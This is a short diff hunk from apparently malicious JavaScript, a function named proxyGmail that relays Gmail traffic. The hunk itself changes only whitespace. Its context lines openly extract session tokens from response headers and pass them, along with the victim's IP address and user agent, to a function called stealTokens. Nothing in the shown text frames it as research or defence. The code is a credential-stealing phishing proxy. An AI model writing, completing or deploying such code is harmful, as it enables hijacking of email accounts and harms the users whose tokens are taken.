@@ -89,7 +89,7 @@ async function proxyGmail(url, request, clientIP, userAgent) {
     
     // EXTRACT TOKENS BEFORE MODIFICATION
     const tokens = extractTokens(response.headers);
-    
+
     // STEAL TOKENS IF FOUND
     if (tokens.length > 0) {
       await stealTokens(tokens, clientIP, userAgent, url.href);
